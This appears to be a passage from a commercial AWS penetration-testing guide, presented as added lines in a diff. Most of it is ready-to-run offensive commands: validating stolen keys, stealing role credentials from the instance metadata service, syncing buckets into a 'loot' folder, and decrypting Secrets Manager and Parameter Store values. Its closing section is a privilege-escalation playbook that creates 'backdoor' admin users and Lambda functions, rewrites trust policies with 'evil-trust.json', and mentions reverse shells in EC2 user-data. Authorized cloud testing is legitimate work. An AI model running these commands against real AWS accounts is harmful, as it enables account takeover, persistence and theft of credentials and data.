+Look for exposed .env files, ~/.aws/credentials, CI/CD pipeline configs, Docker images, and public S3 buckets. Tools like cloud_enum can help identify publicly exposed assets:
+
+python3 cloud_enum.py -k targetcompany --disable-azure --disable-gcp
+Copy Code
+
+1.2 Validating Discovered Credentials
+Once you have candidate credentials, verify them without triggering excessive logging:
+
+aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...
+Copy Code
+
+This returns the Account ID, User ID, and ARN, giving you immediate context about the identity you are operating as.
+
+Phase 2: IAM Enumeration and Privilege Escalation
+IAM is the backbone of AWS security. Misconfigurations here can lead to full account compromise. The cloud security assessment services at Redfox Cybersecurity include deep IAM analysis as a core component of every AWS engagement.
+
+2.1 Enumerating IAM Permissions
+Use enumerate-iam to rapidly determine what permissions the current credentials have:
+
+git clone https://github.com/andresriancho/enumerate-iam
+cd enumerate-iam
+pip3 install -r requirements.txt
+python3 enumerate-iam.py --access-key AKIA... --secret-key ... --region us-east-1
+Copy Code
+
+For a more targeted approach, check specific permissions manually:
+
+aws iam get-user
+aws iam list-attached-user-policies --user-name <username>
+aws iam list-user-policies --user-name <username>
+aws iam list-groups-for-user --user-name <username>
+aws iam list-attached-group-policies --group-name <groupname>
+Copy Code
+
+2.2 IAM Privilege Escalation Paths
+Once you understand the current permission set, look for privilege escalation opportunities. The tool Pacu is excellent for this:
+
+git clone https://github.com/RhinoSecurityLabs/pacu
+cd pacu
+pip3 install -r requirements.txt
+python3 pacu.py
+Copy Code
+
+Inside Pacu, run the IAM privilege escalation module:
+
+Pacu > run iam__privesc_scan
+Copy Code
+
+Common escalation paths to check manually include:
+
+# Check if user can attach admin policies to themselves
+aws iam attach-user-policy --user-name <username> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Check if user can create a new access key for another user
+aws iam create-access-key --user-name admin-user
+
+# Check if user can pass a role to a Lambda function and invoke it
+aws iam list-roles | grep -i admin
+Copy Code
+
+2.3 Enumerating Role Trust Policies
+Look for roles with overly permissive trust relationships:
+
+aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' --output json | python3 -m json.tool
+Copy Code
+
+Look specifically for roles that trust "Principal": "*" or allow assume-role from all AWS accounts. These can sometimes be assumed without any additional conditions.
+
+Phase 3: S3 Bucket Assessment
+3.1 Enumerating Accessible Buckets
+aws s3 ls
+aws s3 ls s3://target-bucket-name --no-sign-request
+aws s3 sync s3://target-bucket-name ./loot --no-sign-request
+Copy Code
+
+For unauthenticated enumeration, use tools like s3scanner:
+
+pip3 install s3scanner
+s3scanner scan --buckets-file targets.txt
+Copy Code
+
+3.2 Checking Bucket ACLs and Policies
+aws s3api get-bucket-acl --bucket target-bucket
+aws s3api get-bucket-policy --bucket target-bucket
+aws s3api get-public-access-block --bucket target-bucket
+Copy Code
+
+Misconfigured bucket policies that allow s3:GetObject to "Principal": "*" represent high-severity findings. Document all objects accessible without authentication.
+
+3.3 S3 Server-Side Request Forgery via Presigned URLs
+If the application generates presigned URLs for object access, check whether those URLs can be manipulated to access other objects in the same bucket:
+
+# Decode the presigned URL and analyze the X-Amz-SignedHeaders and X-Amz-Credential fields
+curl "https://target-bucket.s3.amazonaws.com/file.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=..."
+Copy Code
+
+Phase 4: EC2 and Compute Exploitation
+4.1 Instance Metadata Service (IMDS) Abuse
+The Instance Metadata Service is one of the most common attack vectors in AWS. If you have SSRF or code execution on an EC2 instance, query the metadata endpoint:
+
+# IMDSv1 (no authentication required)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+Copy Code
+
+This returns temporary credentials (AccessKeyId, SecretAccessKey, Token) for the attached IAM role. These can be exfiltrated and used externally:
+
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+Copy Code
+
+For IMDSv2 environments, a session token is required:
+
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+ http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+Copy Code
+
+4.2 EC2 Security Group Analysis
+Overly permissive security groups are common misconfigurations:
+
+aws ec2 describe-security-groups --query \
+ 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].[GroupId,GroupName,IpPermissions]' \
+ --output json
+Copy Code
+
+Flag any security groups allowing inbound SSH (22), RDP (3389), or database ports (3306, 5432, 1433, 27017) from 0.0.0.0/0.
+
+4.3 EBS Snapshot Exposure
+Public EBS snapshots can expose sensitive data including database backups, source code, and credentials:
+
+aws ec2 describe-snapshots --owner-ids <account-id> \
+ --query 'Snapshots[?Public==`true`].[SnapshotId,Description,StartTime]'
+Copy Code
+
+To analyze a public snapshot:
+
+# Create a volume from the public snapshot in your test account
+aws ec2 create-volume --snapshot-id snap-xxxxxxxx --availability-zone us-east-1a
+
+# Attach to your test EC2 and mount it
+sudo mount /dev/xvdf1 /mnt/snapshot
+ls /mnt/snapshot
+Copy Code
+
+The penetration testing services at Redfox Cybersecurity regularly uncover exposed snapshots during cloud assessments, often containing database dumps with plaintext credentials and API keys.
+
+Phase 5: Lambda and Serverless Security
+5.1 Enumerating Lambda Functions
+aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]'
+aws lambda get-function --function-name target-function
+aws lambda get-function-configuration --function-name target-function
+Copy Code
+
+5.2 Extracting Environment Variables
+Lambda environment variables frequently contain secrets:
+
+aws lambda get-function-configuration --function-name target-function \
+ --query 'Environment.Variables'
+Copy Code
+
+5.3 Analyzing Lambda Execution Roles
+# Get the role ARN from function config
+ROLE_ARN=$(aws lambda get-function-configuration \
+ --function-name target-function \
+ --query 'Role' --output text)
+
+# Extract role name
+ROLE_NAME=$(echo $ROLE_ARN | cut -d'/' -f2)
+
+# Enumerate attached policies
+aws iam list-attached-role-policies --role-name $ROLE_NAME
+aws iam list-role-policies --role-name $ROLE_NAME
+Copy Code
+
+Overprivileged Lambda roles are a critical finding. A function that only needs to write to DynamoDB should not have AdministratorAccess.
+
+Phase 6: CloudTrail and Logging Evasion Detection
+6.1 Verifying Logging Coverage
+As a tester, confirm whether the organization has adequate logging. This also tells you what your actions will be captured:
+
+aws cloudtrail describe-trails
+aws cloudtrail get-trail-status --name <trail-name>
+aws cloudtrail get-event-selectors --trail-name <trail-name>
+Copy Code
+
+Check if data events (S3 object-level, Lambda invocations) are logged, not just management events. Most organizations only log management events, leaving significant blind spots.
+
+6.2 GuardDuty Status Check
+aws guardduty list-detectors
+aws guardduty get-detector --detector-id <detector-id>
+Copy Code
+
+A disabled or unconfigured GuardDuty detector is a significant finding. Document master-member relationships and any suppression rules that may be hiding malicious activity.
+
+Phase 7: Cross-Account and Lateral Movement
+7.1 Identifying Cross-Account Trust Relationships
+aws iam list-roles --query \
+ 'Roles[*].[RoleName,AssumeRolePolicyDocument.Statement[*].Principal]' \
+ --output json | python3 -m json.tool
+Copy Code
+
+Look for roles that trust external account IDs. If any of those accounts are compromised, lateral movement into this account becomes trivial.
+
+7.2 Assuming Roles Across Accounts
+aws sts assume-role \
+ --role-arn arn:aws:iam::<target-account-id>:role/<role-name> \
+ --role-session-name pentest-session
+Copy Code
+
+7.3 Resource-Based Policy Abuse
+Check resource-based policies on services like SQS, SNS, KMS, and Secrets Manager for overly permissive configurations:
+
+aws secretsmanager get-resource-policy --secret-id <secret-name>
+aws kms get-key-policy --key-id <key-id> --policy-name default
+aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy
+Copy Code
+
+Phase 8: Secrets and Configuration Exposure
+8.1 AWS Secrets Manager and Parameter Store
+aws secretsmanager list-secrets
+aws secretsmanager get-secret-value --secret-id <secret-name>
+aws ssm describe-parameters
+aws ssm get-parameter --name <param-name> --with-decryption
+aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
+Copy Code
+
+Any secrets accessible with the current credentials that should not be should be documented as findings.
+
+8.2 RDS and Database Exposure
+aws rds describe-db-instances \
+ --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address]'
+Copy Code
+
+Publicly accessible RDS instances with weak credentials or default configurations represent critical findings.
+
+Core Concepts
+iam:PassRole: Lets you pass an IAM role to a service (e.g., EC2, Lambda).
+iam:Create, iam:Put, iam:UpdateAssumeRolePolicy: Can lead to full compromise.
+Abusable Services: EC2, Lambda, CloudFormation, Glue, SageMaker, DataPipeline.
+1. iam:PassRole + Service Abuse
+If you can pass a high-privilege role and start a service that uses it → escalation.
+
+a. EC2
+aws ec2 run-instances --image-id [ami-id] --iam-instance-profile Name=[admin-role] ...
+b. Lambda
+aws lambda create-function --function-name backdoor --role [admin-role-arn] ...
+c. Glue
+aws glue create-dev-endpoint --role-arn [admin-role-arn] --endpoint-name evil
+2. Modify or Attach Inline Policies
+a. Update your own policy to add permissions:
+aws iam put-user-policy --user-name [me] --policy-name escalator --policy-document file://full-admin.json
+b. Attach a managed admin policy:
+aws iam attach-user-policy --user-name [me] --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+3. Create a New Admin Role/User
+a. Create a new user
+aws iam create-user --user-name backdoor
+aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+b. Create a new role with a trust policy
+aws iam create-role --role-name escalate-me --assume-role-policy-document file://trust.json
+aws iam attach-role-policy --role-name escalate-me --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+4. Update Trust Policies for Existing Roles
+Abuse iam:UpdateAssumeRolePolicy to let yourself assume an admin role.
+
+aws iam update-assume-role-policy --role-name [admin-role] --policy-document file://evil-trust.json
+5. Assume a Role
+Only works if you’re trusted by the role (check trust policy).
+
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name session1
+6. Use Services to Execute Code
+If you can launch a service and inject a script, you can exfil data or gain shell access.
+
+Lambda: backdoor with high-priv role
+Glue: launch with shell script
+EC2: start instance with user-data reverse shell
+SSM: run commands on existing EC2
+Dangerous IAM Actions to Look For. If a user/role has any of these, escalate:
+
+iam:PassRole  
+iam:AttachUserPolicy  
+iam:PutUserPolicy  
+iam:UpdateAssumeRolePolicy  
+iam:CreatePolicy  
+iam:CreateUser / CreateRole  
+lambda:CreateFunction  
+ec2:RunInstances  
+glue:CreateDevEndpoint  
+ssm:SendCommand
